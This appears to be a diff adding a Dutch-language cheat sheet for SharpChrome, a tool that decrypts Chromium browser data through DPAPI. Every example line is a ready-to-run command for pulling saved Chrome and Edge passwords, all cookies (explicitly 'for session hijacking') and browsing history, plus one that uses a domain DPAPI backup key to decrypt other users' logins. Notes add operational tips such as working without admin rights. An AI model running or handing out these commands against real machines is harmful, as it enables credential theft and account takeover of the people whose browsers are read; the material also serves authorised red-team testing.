@@ -1,0 +1,51 @@
+# SharpChrome — Chrome/Edge wachtwoorden, cookies en history extraheren
+# Decrypteert Chromium-gebaseerde browser data via DPAPI
+#
+# === Syntax ===
+# SharpChrome.exe [commando] [opties]
+#
+# === Commando's ===
+# logins       Opgeslagen wachtwoorden extraheren
+# cookies      Browser cookies extraheren (session hijacking)
+# history      Browsegeschiedenis ophalen
+# all          Alle bovenstaande commando's uitvoeren
+#
+# === Opties ===
+# /target:path        Pad naar User Data directory
+# /browser:chrome     Browser kiezen: chrome, edge, brave
+# /format:json        Output formaat: json of csv
+# /cookie:NAME        Filter op specifieke cookie naam
+# /url:URL            Filter op specifieke URL
+# /pvk:key.pvk        Domain DPAPI backup key voor andere gebruikers
+# /statekey:KEY       AES state key (handmatig)
+# /unprotect          Gebruik CryptUnprotectData (huidige gebruiker)
+#
+# === Voorbeelden ===
+
+# Alle opgeslagen Chrome wachtwoorden
+SharpChrome.exe logins
+
+# Chrome wachtwoorden als JSON
+SharpChrome.exe logins /format:json
+
+# Alle cookies extraheren (voor session hijacking)
+SharpChrome.exe cookies
+
+# Cookies voor specifieke site
+SharpChrome.exe cookies /url:target.com
+
+# Edge browser wachtwoorden
+SharpChrome.exe logins /browser:edge
+
+# Alles extraheren (logins + cookies + history)
+SharpChrome.exe all
+
+# Andere gebruiker met domain backup key
+SharpChrome.exe logins /pvk:backup.pvk /target:"C:\Users\USER\AppData\Local\Google\Chrome\User Data"
+
+# Browsegeschiedenis
+SharpChrome.exe history
+
+# NOTE: Werkt voor huidige gebruiker zonder admin
+# NOTE: Andere gebruikers vereisen DPAPI backup key of hun wachtwoord
+# NOTE: Chrome/Edge moeten gesloten zijn voor cookie extractie
